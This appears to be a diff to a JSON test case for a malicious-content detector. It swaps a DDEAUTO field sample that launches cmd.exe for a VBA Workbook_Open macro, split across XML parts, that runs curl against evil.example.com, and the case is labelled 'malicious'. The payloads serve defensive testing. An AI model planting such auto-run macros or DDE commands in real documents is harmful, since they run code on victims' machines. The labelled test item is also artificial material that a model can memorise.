@@ -5,11 +5,11 @@
   "generator_id": "structural-variations",
   "generator_version": "1.0.0",
   "seed": -1598650650,
-  "content": "> <w:instrText>DDEAUTO c:\\Windows\\System32\\cmd.exe \"/c calc.exe\"</w:instrText>\n> ",
-  "content_hash": "b3b21d3a2776e01f1bed5f64aaa991b3f034d0d8cef4753877c58ad589146d66",
+  "content": "<message>\n<part>Private Sub Workbook_Open()\n  CreateObject(\"WScript.Shell\").Run</part>\n<part>\"curl http://evil.example.com/\"\nEnd Sub\n</part>\n</message>",
+  "content_hash": "a4ed5e068cc0408cb5764f81102b72f77da3b75595a3f8c3d91787fdf0cce818",
   "content_type": "text",
   "expected_verdict": "malicious",
   "expected_modules": [],
-  "variation_type": "structural:markdown-blockquote",
+  "variation_type": "structural:split-xml",
   "difficulty": "moderate"
 }
